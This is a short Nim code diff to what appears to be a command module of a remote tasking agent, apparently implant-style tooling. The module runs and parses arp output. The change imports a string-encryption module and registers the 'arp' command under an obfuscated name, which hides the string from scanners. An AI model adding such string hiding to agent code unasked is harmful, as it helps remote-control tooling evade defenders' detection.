@@ -1,6 +1,7 @@
 import std/[json, osproc, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc parseArpN(raw: string): JsonNode =
   ## Parse `arp -n` (Linux) or `arp -a` (Windows) output.
@@ -61,4 +62,4 @@ proc arpExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initArp*() =
-  register("arp", arpExecute)
+  register(hidstr("arp"), arpExecute)
